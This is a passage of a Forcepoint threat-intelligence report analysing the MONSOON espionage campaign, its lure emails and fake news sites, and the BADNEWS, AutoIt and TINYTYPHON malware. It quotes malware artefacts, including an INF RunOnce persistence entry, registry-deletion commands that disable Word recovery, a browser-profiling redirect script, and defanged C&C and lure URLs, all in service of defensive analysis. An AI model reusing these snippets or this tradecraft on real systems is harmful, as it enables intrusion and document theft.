{
    "title": "forcepoint-security-labs-monsoon-analysis-report",
    "text": "  \n  \nMONSOON – \nANALYSIS OF AN \nAPT CAMPAIGN  \n \nESPIONAGE AND DATA L OSS UNDER THE COVE R \nOF CURRENT AFFAIRS  \n \nWRITTEN BY ANDY SETT LE, NICHOLAS GRIFFIN , ABEL TORO  \n \nForcepoint ™ Security Labs™   |  Special Investigation s \n Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  1/57 \n \n \nFigure 1 – Word -Cloud of Lure Document Titles  \n \n“Our MONSOON investigation has uncovered what is clearly a concerted and persistent campaign to steal \nsensitive data from a variety of critical sources.   The use of both current and topical themes [illustrated \nabove] as lures, not only indicates the precision level of targeting but also the targeting decision process \nitself. ” \n \nAndy Settle Head of Special Investigations  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  2/57 \n \nTABLE  OF CONTENTS  \nExecutive Summary  ................................ ................................ ................................ ................................ ...... 4 \nAcknowledgements  ................................ ................................ ................................ ................................ ... 4 \nSummary of Observations  ................................ ................................ ................................ ............................  5 \nKey Features  ................................ ................................ ................................ ................................ .............  5 \nAdversary.  ................................ ................................ ................................ ................................ .............  5 \nIntent.  ................................ ................................ ................................ ................................ ....................  5 \nInfrastructure  ................................ ................................ ................................ ................................ .........  5 \nCapability  ................................ ................................ ................................ ................................ ..............  5 \nVictims  ................................ ................................ ................................ ................................ ...................  5 \nVictims of Interest  ................................ ................................ ................................ ................................ .. 5 \nVictim of Opportunity  ................................ ................................ ................................ .............................  5 \nTimeframe  ................................ ................................ ................................ ................................ .............  5 \nTechnical Analysis  ................................ ................................ ................................ ................................ ........  6 \nInitial Discovery  ................................ ................................ ................................ ................................ .........  6 \nPivoting via VirusTotal  ................................ ................................ ................................ ...........................  6 \nCyber Crime Bill.  ................................ ................................ ................................ ................................ ... 6 \nPivoting by Author.  ................................ ................................ ................................ ................................  6 \nDistribution Mechanism  ................................ ................................ ................................ .........................  9 \nE-Mail Lures & Malware Distribution  ................................ ................................ ................................ ........  10 \nEmail Lures  ................................ ................................ ................................ ................................ .........  10 \nTopical News Lures  ................................ ................................ ................................ ................................ . 12 \nNews Site  ................................ ................................ ................................ ................................ ............  12 \nGoogle Plus.  ................................ ................................ ................................ ................................ ........  13 \nFacebook.  ................................ ................................ ................................ ................................ ...........  14 \nTwitter Account.  ................................ ................................ ................................ ................................ ... 15 \nMalware Analysis  ................................ ................................ ................................ ................................ ........  16 \nWeaponised Documents  ................................ ................................ ................................ .........................  16 \nExploitation of Known Vulnerabilities  ................................ ................................ ................................ ... 16 \nBADNEWS Weaponised Documents  ................................ ................................ ................................ ... 17 \nAutoIt Backdoor & Unknown Logger Weaponised Documents  ................................ ............................  19 \nTINYTYPHON Weaponised Documents  ................................ ................................ ..............................  19 \nPoten tial Silverlight Exploit  ................................ ................................ ................................ ......................  20 \nSilverlight Profiling  ................................ ................................ ................................ ...............................  21 \nBADNEWS Malware  ................................ ................................ ................................ ................................  22 \nDLL Side -Loading  ................................ ................................ ................................ ................................  22 \nPersistence  ................................ ................................ ................................ ................................ .........  22 \nC&C Channels  ................................ ................................ ................................ ................................ ..... 23 \nC&C Mechanism  ................................ ................................ ................................ ................................ . 26 \nbadnews_decoder.py  ................................ ................................ ................................ ..........................  27 \nCommand Set  ................................ ................................ ................................ ................................ ..... 28 \nKeylogger  ................................ ................................ ................................ ................................ ............  29 \nDocument Crawler  ................................ ................................ ................................ ...............................  29 Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  3/57 \n \nWindow Message Processor  ................................ ................................ ................................ ...............  29 \nUpdater VBScript  ................................ ................................ ................................ ................................ . 30 \nAutoIt Backdoor  ................................ ................................ ................................ ................................ ....... 30 \nDecompiled AutoIt Script  ................................ ................................ ................................ .....................  31 \nDocument Exfiltration  ................................ ................................ ................................ ..........................  31 \nPrivilege Escal ation.  ................................ ................................ ................................ ............................  31 \nPowerShell Second Stage & Metasploit Meterpreter  ................................ ................................ ...........  32 \nUnknown Logger Public V 1.5  ................................ ................................ ................................ .................  37 \nConfigura tion ................................ ................................ ................................ ................................ ....... 40 \nTINYTYPHON  ................................ ................................ ................................ ................................ .........  41 \nConfiguration & Persistence  ................................ ................................ ................................ ................  41 \nDocument Crawler  ................................ ................................ ................................ ...............................  42 \nVictims  ................................ ................................ ................................ ................................ .................  44 \nAttribution  ................................ ................................ ................................ ................................ ...................  47 \nVictims  ................................ ................................ ................................ ................................ ....................  47 \nAdversaries  ................................ ................................ ................................ ................................ .............  47 \nCui Bono?  ................................ ................................ ................................ ................................ ...........  47 \nInfrastructure  ................................ ................................ ................................ ................................ ...........  48 \nIndicators of Compromise  ................................ ................................ ................................ ...........................  49 \nLure URLs  ................................ ................................ ................................ ................................ ...............  49 \nWeaponised Document Hashes (SHA1)  ................................ ................................ ................................ .. 49 \nBADNEWS Malware Hashes (SHA1)  ................................ ................................ ................................ ...... 50 \nAutoIt Malware Hashes (SHA1)  ................................ ................................ ................................ ...............  50 \nTINYTYPHON Malware Hashes (SHA1)  ................................ ................................ ................................ . 50 \nUnknown Logger Malware Hashes (SHA1)  ................................ ................................ .............................  50 \nMiscellaneous Samples (SHA1)  ................................ ................................ ................................ ..............  50 \nBADNEWS C&C  ................................ ................................ ................................ ................................ ...... 50 \nAutoIt C&C  ................................ ................................ ................................ ................................ ..............  51 \nMeterpreter C&C  ................................ ................................ ................................ ................................ ..... 51 \nTINYTYPHON C&C  ................................ ................................ ................................ ................................ . 51 \nNames of Lure & Weaponised Files  ................................ ................................ ................................ ........  51 \nAbout Us  ................................ ................................ ................................ ................................ ....................  55 \nFigures  ................................ ................................ ................................ ................................ .......................  56 \nReferences  ................................ ................................ ................................ ................................ .................  57 \n \n \n \n \n Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  4/57 \n \nEXECUTIVE  SUMMARY  \n \nMONSOON  is the name  given  to the Forcepoint  Security  Labs™  \ninvestigation  into an ongoing  espionag e campaign  that the Special  \nInvestigations  team  have  been  tracking  and analysing  since  May 2016.   \nThe overarching campaign  appears  to target  both Chinese  nationals  \nwithin  different  industries  and government  agencies  in Southern  Asia.  It \nappears  to have  started in December  2015  and is still ongoing  as of July \n2016.  \nAmongst the e vidence gathered during th e MONSOON investigation were \na number of indicators which make it highly probable1 that this adversar y \nand the OPERATION HANGOVER  [1], [2] adve rsary are one and  the \nsame.  These indicator include t he use of the same i nfrastructure  for the \nattacks , similar Tactics, Techniques and Procedures (TTPs), the targeting \nof demographically similar victims and operati ng geographically within the \nIndian S ubcontinent . \nThe malware  components  used  in MONSOON  are typically  distributed  through  weaponised  documents  \nsent through  e-mail to specifically  chosen  targets.  Themes  of these  documents  are usually  political  in \nnature  and taken  from recent  publications  on topical  current  affairs.   Several  malware  components  have  \nbeen  used  in this operation  including  Unknown  Logger  Public , TINYTYPHON , BADNEWS , and an AutoIt  \n[3] backdoor.  \nBADNEWS  is particular ly interesting,  containing  resilient  command -and-control  (C&C)  capability  using  RSS \nfeeds,  Github,  forums,  blogs  and Dynamic  DNS  hosts . \nThis whitepaper  provides  an in-depth  understanding  and insight  into the actors  and their campaign.   It \nincludes  detail ed analysis  and findings , previously  undocumented  malware  components,  victims,  and \ninfrastructure  involved.  \nACKNOWLEDGEMENTS  \nWe would  like to acknowledge  both Kaspersky  and Cymmetria  [4] who have  published  their own research  \non the groups  referred  to as \"PATCH WORK\"  and \"DROPPER  ELEPHANT\".   We also recognise  the \nanalysis  by Blue Coat  in tracking  OPERATION  HANGOVER  in the past [1]. \nWe would  like to thank  the wider  Forcepoint  Security  Labs  team  for their help with our investigation.  We \nwould  also like to give special  thanks  to Ran Mosessco  for assisting  with specific  analysis.  \n                                                \n1 SEE: “Uncertainty Yardstick”, Page  3 -32 \nhttps://www.gov.uk/government/uploads/system/uploads/attachment_data/file/311572/20110830_jdp2_00_ed3_with_change1.pdf  “More infor mation is always \nbetter than less. When \npeople know the reason \nthings are happening, even if \nit's bad news , they can \nadjust their expectations and \nreact accordingly. Keeping \npeople in the dark only \nserves to stir negative \nemotions” . \nSimon Sinek  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  5/57 \n \nSUMMARY OF OBSERVATIONS  \nKEY FEATURES  \nAdversary.   Strong indication that this is conducted by  \nthe OPERATION HANGOVER  group  [1]. \nThis group has been active since at least 2010  [2]. \nIntent.  Data Exfiltration.  \nInfrastructure .  Non-traditional resilient and obscure  \nC&C . Including GitHub, forums, news i tems and RSS \nfeeds.  \nCapability . BADNEWS and TINYTYPHON malware.  \nRe-use of tool sets including: Metasploit, AutoIt \nBackdoor, MyDoom, Shellcode loading via Powershell, \nUnknown Logger. “PATCHWORK”  [4]. \nCVE Exploitation.  \nCurrent News Lures  – Lures via email with tra cking \nimages.  \nOver 172 lure documents, most referencing topical news \nitems, releva nt to the victims of interest.  M ost common \nlure document: 2 016_China_Military_PowerReport.  \nVictims .  Over 110 different victim countries and 6,300 \nvictim IP addresses.  \nVicti ms of Interest .  Government Agencies, Armed \nForces, Embassies: S ri Lanka, Ceylon, South Korean,  \nVictim of Opportunity .  Those with passing interest in \nChinese military strategy being ‘snared’ by the lure web \nsite. Majority in China  (61% of all victims)  \nTimeframe .  Between December 2015 to July 2016  \n \n •\"Customer\" provided target list?\n•Thematic and regional recon? \nthemselves?Stage 1 -\nRecon\n•Targeted email\n•Google+\n•Facebook\n•Twitter\n•chinastrat[.com]Stage 2 -\nLure\n•N/AStage 3 -\nRedirect\n•Weaponized documents\n•Silverlight exploit\n•UAC bypassStage 4 -\nExploitation\n•BADNEWS\n•TINYTYPHON\n•AutoIt Backdoor\n•Unknown Logger\n•Metasploit MetepreterStage 5 -\nDropper\n•RSS\n•GitHub\n•Forums\n•News Articles\n•Dynamic DNS hostsStage 6 -\nCall Home\n•Sensitive DocumentsStage 7 -\nData LossForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  6/57 \n \nTECHNICAL ANALYSIS  \nINITIAL  DISCOVERY  \nPivoting via VirusTotal .  Virus  Total2 (VT) Intelligence  queries  are often  constructed  in order  to hunt for \nnew,  unusual  and interesting  malware  as part of the routine  work  performed  by the Special  Investigations  \nteam.   The initial  discovery  of MONSOON  stemmed  from one of these  queries.   During  such  activities,  an \nRTF document  was identified  that warranted  further  investigation.    \nCyber  Crime  Bill.  A specific  document  was singled -out for \nanalysis  via VT for number  of reasons .  These  included:  a \nlow detection  rate, a low number  of submissions , an \ninteresting  set of default  languages  including  US English,  \nSaudi  Arabic  and PRC  Chinese,  that it exploited  a known  \nvulnerability  (CVE-2015 -1641  [5]) and that it had filename s \nwith political  themes  including  “Microsoft  Word  - \nTelecommunications  Policy  - APPROVED.DOCX”  and \n\"Cyber_Crime_bill.doc\"3: \nThis document  was opened  in a virtualised  lab environment  \nand was seen  to “drop” malware.   By analysing  this malware  \nis was possible  to determine  that it was not of a known  or \ndocumented  malware  family.   It contained  interesting  \nfunctionality  that warranted  further  investigation  (see below) . \nThis malware  was named  by Special  Investigations  as \nBADNEWS  after its ability  to use news  sites and blogs  to \nobtain  its C&C  address.   \nPivoting  by Author.   By exploiting  the document  information  \nfound  in the original  malicious  RTF, the name  of the user \nwho last modified  the docume nt was identified:  \n                                                \n2 https://www.virustotal.com / \n3 \nhttps://www.virustotal.com/en/file/34cdfc67942060ba30c1b9ac1db9bd042f0f8e487b805b8a3e1935b4d2508db6/analy\nsis/  PRELIM INARY  \n  \n… \n \n(1) This Act may be called  the Prevention  \nof Electronic  Crimes  Act, 2015.  \n  \n(2) It extends  to the whole  of Pakistan.  \n  \n(3) It shall apply  to every  citizen  of \nPakistan  wherever  he may be, and also \nto every  other  person  for the time being  \nin Pakis tan. \n  \n(4) It shall come  into force  at once.  \n… \nFigure 2 – Cyber_Crime_Bill.doc (Excerpt)  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  7/57 \n \nUsing  another  VT search , the following 6 documents  matching  this author  information were found:  \n \nFigure  4 – Search  VT by Author  Metadata  \nThe low number  of results, similar  file sizes  and the same  CVE exploitat ion gave  a high level of certainty  \nthat these  documents  belong  to the same  actor.  \n  \nFile Size               : 1407 kB \nFile Type               : RTF \nFile Type Extension      : rtf \nMIME Type               : text/rtf  \nTitle                   : Microsoft  Word - Telecommunications  Policy - APPROVED.DOCX  \nAuthor                  : mhjaved \nLast Modified  By        : ayyo \nCreate Date             : 2016:04:20  12:58:00 \nModify Date             : 2016:04:20  12:58:00  \nRevision  Number         : 2 \nTotal Edit Time         : 0 \nPages                   : 12 \nWords                   : 7076 \nCharacters               : 40335 \nCompany                 : Microsoft  \nCharacters  With Spaces  : 47317 \nInternal Version Number : 32859 \nFigure 3 – EXIF info for Cyber_Crime_Bill.docx  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  8/57 \n \nThe VT reports  showed  known  names  of some  \nof these  samples.  One of the samples  used  \ngenuine content from  the National  Institute  for \nDefence  Studies  Japan  document  NIDS  China \nSecurity  Report  20164. \nThe specific  filename  used  for this sample  was \n\"china_report_EN_web_2016_A01.doc\" .  \nUsing  Google  to search  for this specific  \nfilename  returned  three  hits.  Two of the \nresults were  for VT and another  for a report  on \nURLQuery.net.  \nOne of the VT results  showed  that the file was \nprovided  from a web server  located on a host \non IP address  37.58.60.195  and that it had \nalso provided  a number  of other,  similar  files5.  \nThe other  VT results  referred to the analysis  of \nthe malicious  file6. \nDATE  TIME  URL \n2016 -05-31 18:51:31  hxxp://www.cnmilit.com/index.php?f=China_Security_Report_CN2016.pps  \n2016 -05-10 00:56:37  hxxp://cnmilit.com/index.php/?f=China_Security_Report_2016.pps  \n2016 -04-20 10:31:31  hxxp://www.cnmilit.com/index.php?f=The_PLA_s_Ne w_Organizational_Structure_Parts_1_and_2\n_01.doc  \n2016 -04-17 18:02:41  hxxp://www.cnmilit.com/index.php?f=China_Security_Report_2016.pps  \n \nFigure  6 – Lures  from 37.58.60.195  \n                                                \n4 http://www.nids.go.jp/english/publication/chinareport/  \n5 https://www.virustotal.com/en/ip -address/37.58.60.195/information/  \n6 \nhttps://www.virustotal.com/en/file/ebd4f62bb85f6de1111cbd613d2d4288728732edda9eb427fe9f51bd1f2d6db2/analys\nis/ \nFigure 5 – Lure Document Cover  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  9/57 \n \nDistribution  Mechanism . The final Google  search  result  was a report  generated  by the URLQuery.net  \nsite: \n \n \n \n \nFigure 7 – URLQuery.net  \nThe site t.ymlp50[. com] is a legitimate  web and e-mail marketing  service .  It is owned  and operated  by the \nBelgian  company  Your  Mailing  List Provider  (YML P).  Further  Google  search es of other  document  names  \nrevealed  similar  redirection  chains  using  the same  service.   Consequently,  it is reasonable  to conclude  that \na number  of “weaponised ” documents  were  delivered  using  YMLP.   \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  10/57 \n \nE-MAIL  LURES  & MALWARE  DISTRIBU TION  \nEmail  Lures .  Using  the information  from the initial  discoveries  and correlating  against  the ‘known  bad’ \ndata collected  by Forcepoint’s  Triton®  AP-Email  it was possible  to track  down  at least  some  of the targeted  \ne-mail lures  used  by the HANGOVER  group in the MONSOON  campaign.  \nThe e-mail themes  are typically  current  political  events  that may be of interest  to the target  recipient . It was \npossible  to identify  sever al Chinese  politically  themed  e-mails  linking  to weaponised  documents.   A \nredacted  example  e-mail can be seen  below.  \n \nFigure  8 – Known  Bad Email  Lure \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  11/57 \n \nUsing YMLP, t he threat  actor  is faking  the sender  using  this service  and embedding  a link to a weaponised  \ndocument  in the e-mail body.  \nExamples  of a number  of email  detai ls and embedded  URLs  can be seen  in the table  below.  \nUTC Time  Subject  Sender  Embedded  URL to Malicious  Document  \n6/29/2016  \n7:12 The Chinese  Statecraft,  The China  \nSyndrome  and it's new legalism  mailreturn@smtp5.ymlpsrvr.net  hxxp://www.newsnstat [.com] /index. php?f=Report_Asia_Program\n_New_Geopolitics.pps  \n6/28/2016  \n4:13 China  Plans  a Breakaway  Faction  of \nthe NSG  mailreturn@smtp6.ymlpsrvr.net  hxxp://www.newsnstat [.com] /index.php?f=Report_Asia_Program\n_New_Geopolitics.pps  \n6/27/2016  \n5:08 Stretching  and Exploiting  Thresholds  \nfor High Order  War mailreturn@smtp1.ymlpsrvr.net  hxxp://www.newsnstat [.com] /index.php?f=China_plan_to_domin\nate_South_China_Sea_and_beyond.doc  \n6/24/2016  \n4:52 2016年成都中国 电子展。  mailreturn@smtp3.ymlpsrvr.net  hxxp://www.newsnstat [.com] /index.php?f=CEF_ Chengdu_July_2\n016.pps  \n5/20/2016  \n8:56 Limits  of Law in the South  China  Sea mailreturn@smtp6.ymlpsrvr.net  hxxp://www.newsnstat [.com] /index.php?f=Limits_of_Law_in_the_\nSouth_China_Sea.pps  \n5/9/2016  \n5:16 China  International  Defence  \nElectronics  Exhibition  (CIDE X) 2016  mailreturn@smtp5.ymlpsrvr.net  hxxp://www.newsnstat [.com] /index.php?f=CIDEX2016.pps  \n4/12/2016  \n4:56 中国安全 战略报告 2016  mailreturn@smtp2.ymlpsrvr.net  hxxp://www.cnmilit [.com] /index.php?f=China_Security_Report_C\nN2016.pps  \n \nFigure 9 – YMLP Lures  \n  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  12/57 \n \nTOPICAL  NEWS  LURES  \nNews  Site.  The attacker s are also operating  a fake political  news  site at chinastrat[. com]. \nThe “downl oads”  section  of this website  contain s similarly  weaponised  documents  to the ones  sent by e-\nmail and these documents drop the same  malware  families.  \nIt is reasonable  to suggest  that the login  credentials  from anybody  who regis ters on the site are also \nharvested.  \n \nFigure 10 – China Strat Screen Shot  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  13/57 \n \nGoogle  Plus.   The actors  have  been  operating  a Google  Plus account  since  December  2014 .  This \naccount  is used to post links to the actors’ fake news  site.  \n \nFigure 11 – Lure Google+ Screen Shot   \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  14/57 \n \nFacebook .  The actors operate a Facebook account.  This account is  also used to post links to the actors’ \nfake news site.  \n \nFigure 12 – Lure Facebook Screen Shot  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  15/57 \n \nTwitter Account.  The actors have operated a Twitter account since December 2014 and use this in a \nsimilar manner to thei r Google + and Facebook account.  \n \nFigure 13 – Lure Twitter Screen Shot  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  16/57 \n \nMALWARE ANALYSIS  \nWEAPONISED  DOCUMEN TS \nExploitation  of Known  Vulnerabilities .  Several  document  types  and document exploits have  been  used  \nin the MONSOON  campaign  to deliver  various  malware  components.  It is reasonable to suggest that the \nactors  are using  a malicious  document  builder  to quickly weaponise  legitimate  documents.  \nThe following  vulnerabilities  have  been  identified  within  the attackers'  documents:  \nVulnerability  Description  \nCVE-2012 -0158  Microsoft  BizTalk  Server  Windows  Common  Controls  (MSCOMCTL.OCX)  \nBug Lets Remote  Users  Execute  Arbitrary  Code  \nCVE-2014 -6352  Microsoft  Windows  CVE-2014 -6352  OLE Package  Manager  Remote  Code  \nExecution  Vulnerability  \nCVE-2015 -1641  Microsoft  Office  Memory  Errors  Let Remote  Users  Execute  Arbitrary  Code  \nand Input  Validation  Flaw Permits  Cross -Site Script ing Attacks  \n \nFigure 14 – Exploited CVEs  \n  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  17/57 \n \nBADNEWS  Weaponised  Documents . The BADNEWS  malware  is typically  packaged  into a malicious  \ndocument  via an encrypted  binary  blob within  that document.  This binary  blob often  contains  a legitimate  \ndecoy  document  that is shown  to the user.   On other  occasions  the decoy  document  is downloaded  \ndirectly . \nCVE-2015 -1641  has been  observed  as being  exploited  to drop BADNEWS.  When  the document  exploit  is \ntriggered,  the shellcode  will drop the binary  blob into the user's  %temp%  folder  along  with an encoded  \nVBScript:  \n \nFigure 15 – Binary Blob Dropped to %temp%  \nThe encoded  VBScript  uses  a file extension  which  is not associated,  by default,  as being  a VBScript  file. \nThe extensions  .domx  and .lgx have  been  observed . The shellcode  is responsible  for adding  a new file \nassociation  for the file extension  which  specifies  that they should  be interpreted  as an encoded  VBScript.  \nFinally,  the shellcode  executes  the encoded  VBScript  file which  will extract  the encrypted  files from the \nbinary  blob,  show  the decoy  document  (if there  is one),  and execute  the malware.  \nThe VBScript  hard-coded  sizes  of the files to extract  from the binary  blob:  \n \nFigure 16 – VB Extract of Blob  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  18/57 \n \nThe decryption  routine  uses  the encryption  key \"ludos ”7 to decrypt  32-byte chunks  of the embedded  files: \n \nFigure 17 – VB Decryption of Embedded Files  \nOur analysis of BADNEWS can be found later in this document [Page: 22] \n  \n                                                \n7 http://starw ars.wikia.com/wiki/Ludos  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  19/57 \n \nAutoIt  Backdoor  & Unknown  Logger  Weaponised  Documents . The majority of weaponised documents \ndrop an AutoIt backdoor . Document s exploiting  CVE-2014 -6352  have  been  observed  installing  the malware  \nvia the following  INF: \n[Version]  \nSignature = \"$CHICAGO$\"  \nclass=61883  \nClasGuid={2E87RBCD -7488-12T1-QYXX-74521ACV1AS4}  \nDriverVer=0/21/2006,61.7600.16385  \n[DestinationDirs]  \nDefaultDestDir  = 1 \n[DefaultInstall]  \nAddReg = RxStart \n[RxStart]   \nHKLM,Software \\Microsoft \\Windows\\CurrentVersion \\RunOnce,Inst all,,%1% \\sysvolinfo.exe  \nThe malware  executable  name  varies.  The following  are some of the  names  we have  observed : \n sysvolinfo.exe  \n svchost.exe  \n rar.exe  \n 360configuration_patch_update_2016v4.exe  \nThe AutoIt  script  is always  roughly  the same,  but some  versions  contain  less functionality.  A full analysis  of \nthe AutoIt  backdoor  can be found  later in this document  [Page:  30]. \nMalware  known as Unknown  Logger  has also been dropped  by the same  sort of weaponised  document.  A \nfull analysis  of Unknown  Logger  can also be found  later in this document  [Page: 37]. \nTINYTYPHON  Weaponised Documents . A third malware used in MONSOON is a small backdoor based \non publicly available code from the MyDoom  [6] worm. This malware will crawl mapped drives for \ndocuments and upload them to its C&C. We have seen this dropped by an RTF exploiting CVE -2012 -0158 \nunder the name \"DPP_INDIA_2016.doc\"8. \nThe document  contains  shellcode  which  drops  a file under  %temp% \\svchost.exe  and then attempts  to \ndisable  Word's  recovery  features  via the following  commands:  \ncmd.exe /c reg delete \"HKCU\\Software \\Microsoft \\Office\\14.0\\Word\\Resiliency\"  /F \ncmd.exe /c reg delete \"HKCU\\Software \\Microsoft \\Office\\12.0\\Word\\Resiliency\"  /F \nThe svchost.exe9 dropped  by the document  executes  an embedded,  base64  encoded  malware  \ncomponent  that we have  named  \"TINYTYPHON \". Our analysis  of this malware  can be found  later in this \ndocument  [Page:  41]. \n  \n                                                \n8 http://starwars.wikia.com/wiki/Ludos  \n9 SHA1: 411387df2 145039fc601bf38192b721388cc5141  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  20/57 \n \nPOTENTIAL SILVERL IGHT EXPLOIT  \nThe weaponised  document  sites such  as cnmilit[.com]  and newsnstat[.com]  will attempt to redirect the user \nto lite.php after 10 seconds:  \n \nFigure 18 – PHP Redirect  \nIt was not possible to access cnmilit[.com]  as of May 2 7, 2016.  It was therefore not possible to analyse \nthe pages served.  However, it was possible to browse to lite.php  on newsnstat[. com].  The content of \nthis page always remained the same over the duration of the investigation.  \n  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  21/57 \n \n \nSilverlight  Profiling . The code profiles whether a system has Microsoft Silverlight installed.  The site then \nrequests lite.php?name=  where the value of name  is 'true' or 'false' depending on whether Silverlight is \ninstalled and accessible or not. No further content was served fro m lite.php  during the investigation.  \nA likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware \nin the case of a user who does not open or get successfully exploited by the weaponised document. This \ncould have been intended as an exploitation of something like CVE -2016 -0034 which is known to have \nbeen adopted by exploit kits back in February 2016 and which pre -dates MONSOON.  \n  HTTP/1.1 200 OK  \nDate: Fri, 27 May 2016 22:32:29 GMT  \nServer: Apache  \nX-Powered-By: PHP/5.5.12  \nContent-Length: 749  \nKeep-Alive: timeout=5, max=100  \nConnection: Keep -Alive \nContent-Type: text/html  \n   \n<script>function hasSilverlightPlugin() {  \n    var slplugin = false;  \n    var browser = navigator.appName; // Get the browser type  \n   \n    if (browser == 'Microsoft  Internet Explorer') {  \n        try { \n            var slControl = new ActiveXObject('AgControl.AgControl');  \n            if (slControl) {  \n                slplugin = true;  \n            } \n        } catch (e) { }  \n    } \n    else { \n        // Netscape, FireFox, Go ogle chrome etc  \n        try { \n            if (navigator.plugins['Silverlight Plug -In']) { \n                slplugin = true;  \n            } \n        } catch (e) { }  \n    } \n    return slplugin;  \n} \nvar javascriptVariable = hasSilverlightPlugin();  \nwindow.location.h ref = 'lite.php?name='+javascriptVariable;  \n</script>  \n Figure 19 – Silverlight Profiling  Forcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  22/57 \n \nBADNEWS MALWARE  \nThe BADNEWS  malware  is capable  of arbitrary  command  execution,  screenshots,  self-updating,  \ndownloading  and executing  files, and directory  listings.  The name  was given  due to its use of RSS feeds,  \nforums,  blogs  and Dynamic DNS  providers  for its C&C  infrastructure.  \nBADNEWS  uses  a DLL side-loading  technique  with a signed  Java  binary  in order  to evade  security  \nsolutions.  It is a first stage  malware  that is likely  to receive  second  stage  malware  components  if the target  \nis of interest,  although  we did not observe  this behaviour.  \nDLL Side -Loading .  The BADNEWS  DLL is typicall y side-loaded  into a legitimate  signed  Java  executable.  \nA specific weaponised  document  analysed10 drops  a binary  blob and an encoded  VBScript  file which  then \nextracts  a decoy  document  along  with the following  3 files: \n MicroScMgmt.exe  \n msvcr71.dll  \n jli.dll \nMicroScMgmt.exe  is a renamed  version  of the legitimate  Java  Runtime's  6.0.390.4  binary  named  java-\nrmi.exe  and is signed  by Sun Microsystems.  This application  requires  the legitimate  msvcr71.dll  and also \nrequires  a DLL named  jli.dll . However,  the jli.dll  here contains  the BADNEWS  malware.  \nWhen  MicroScMgmt.exe  is executed,  it will load up the malicious  jli.dll  and ultimately  call the \nJLI_WildcardExpandClasspath_0  export  in the DLL.   At this point  the BADNEWS  code  will take over and \nbegin  performing  its malicious  routines.  This technique  is a stealth  tactic  to evade  anti-malware  solutions  \nwhich  are notoriously  weak at detecting  side-loaded  malware.   \nThe malware  will spawn  2 threads,  one to perform  key-logging  and one to crawl  the local hard-drives  for \ndocument  files. \nPersistence .  BADNEWS  installs  a registry  key under  \nHKEY_CURRENT_USER \\SOFTWARE \\Microsoft \\Windows \\CurrentVersion \\Run in order  to remain  \npersistent  on the system.  \n \nFigure 20 – Windows Registry Keys  \n  \n                                                \n10 SHA1: 11064dcef 86ac1d94c170b24215854efb8aad542  \nForcepoint ™ Security Labs™   |  Special Investigation s \n \n \n MONSOON – ANALYSIS OF AN APT CA MPAIGN  Revision: 1 .07  |  TLP-WHITE   |  23/57 \n \nC&C Channels .  BADNEWS  is typically  built with several  hard-coded  channels  which  it can use to obtain  \ncommands  or change  its C&C.  These  C&C  channels  include  RSS feeds,  Github,  forums,  blogs  and \nDynamic  DNS  hosts.  \nIn the sample  analysed,  the malware  had several  hard-coded  C&C  channels  although  some  were  corrupted  \nand did not work  correctly:  \nhxxp://feeds.rapidfeeds.com/81913/  \nhxxps://raw.githubusercontent.com/azeemkhan89/cartoon/master/cart.xml  \nhxxp://www.webrss.com/createfeed.phpfeedid=47448  